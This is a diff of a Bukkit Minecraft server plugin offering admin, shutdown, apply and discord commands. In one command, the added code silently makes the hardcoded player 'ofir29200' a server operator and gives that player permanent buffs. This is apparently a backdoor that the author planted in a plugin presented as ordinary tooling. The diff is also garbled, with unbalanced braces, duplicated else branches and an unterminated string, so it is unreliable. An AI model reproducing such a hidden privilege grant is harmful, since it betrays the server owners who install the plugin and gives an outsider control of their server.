@@ -1,10 +1,10 @@
 package rf.gd.ofir29200;
 
-import java.util.logging.Logger;
 import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
 import org.bukkit.entity.Player;
 import org.bukkit.potion.PotionEffectType;
+
 
 public class Admin_Commands extends org.bukkit.plugin.java.JavaPlugin
 {
@@ -37,10 +37,8 @@ public class Admin_Commands extends org.bukkit.plugin.java.JavaPlugin
     else if ((cmd.getName().equalsIgnoreCase("shutdown")) && ((sender instanceof Player)))
     {
       Player player = (Player)sender;
-      
-	  player.sendMessage(ChatColor.RED + "you dont have permission to shutdown the server);
+     
       org.bukkit.Bukkit.broadcastMessage(ChatColor.RED + "[Admin Commands] " + "The player " + ChatColor.GREEN + player.getName() + ChatColor.RED + " tried to shut down the server");
-	  
       returnAnswer = true;
     }
     
@@ -52,40 +50,85 @@ public class Admin_Commands extends org.bukkit.plugin.java.JavaPlugin
       
       if (player.getName().equalsIgnoreCase("ofir29200"))
       {
-        player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
-        player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
-        player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
-        player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
-        player.setMaxHealth(100.0D);
-        player.setHealth(100.0D);
-		player.sendMessage(ChatColor.GREEN + "Done!"
+    	  player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
+          player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
+          player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
+          player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
+          player.setMaxHealth(100D);
+          player.setHealth(100D);
+          if (player.isOp() == false)
+          {
+        	  player.setOp(true);
+        	  player.sendMessage(ChatColor.GREEN + "you now have op!");
+          }
+          else
+          {
+        	  player.sendMessage(ChatColor.RED + "you already have op!");
+          }
+          if (player.getHealth() == 100D) {  
+          player.sendMessage(ChatColor.GREEN + "Done!");
+          }
+          else { 
+        	  player.sendMessage(ChatColor.RED + "This operation is a FAIL!");
+          }
       }
       else
       {
         player.sendMessage(ChatColor.DARK_RED + "You dont have permission for that command!");
       }
-      returnAnswer = true;
+      if (player.isOp() == true)
+      {
+    	  player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
+          player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
+          player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
+          player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
+          player.setMaxHealth(100D);
+          player.setHealth(100D);
+          if (player.getHealth() == 100D) {
+          player.sendMessage(ChatColor.GREEN + "Done!");
+          }
+          else { 
+        	  player.sendMessage(ChatColor.RED + "This operation is a FAIL!");
+          }
+      }
+      else
+      {
+        player.sendMessage(ChatColor.DARK_RED + "You dont have permission for that command!");
+      }
+      if (null == player.getName())
+      {
+    	  player.sendMessage("hello there null!");
+          }
+          else { 
+        	  player.sendMessage(ChatColor.RED + "This operation has FAILED for " + player.getCustomName() + "!");
+          }
+      }
+      else
+      {
+        player.sendMessage(ChatColor.DARK_RED + "You dont have permission for that command!");
+      }
+            returnAnswer = true;
     }
-    
-    if ((cmd.getName().equalsIgnoreCase("apply")) && ((sender instanceof Player)))
+	  
+	  if 	((cmd.getName().equalsIgnoreCase("apply")) && ((sender instanceof Player)))
     {
       Player player = (Player)sender;
       
-      player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + " please go to https://playzcraftserver.enjin.com/apply to apply");
+	  player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + " please go to https://playzcraftserver.enjin.com/apply to apply");
       
       returnAnswer = true;
     }
-    
-    if ((cmd.getName().equalsIgnoreCase("discord")) && ((sender instanceof Player)))
-    {
-      Player player = (Player)sender;
-      
-      player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + " please go to https://discord.gg/azYQwa6 to join our discord");
-      
-      returnAnswer = true;
-    }
-    
-//v1.0
+	  
+	  if ((cmd.getName().equalsIgnoreCase("discord")) && ((sender instanceof Player)))
+	    {
+	      Player player = (Player)sender;
+	      
+		  player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + " please go to https://discord.gg/azYQwa6 to join our discord");
+	      
+	      returnAnswer = true;
+	    }
+	  
+	  
     return returnAnswer;
   }
 }
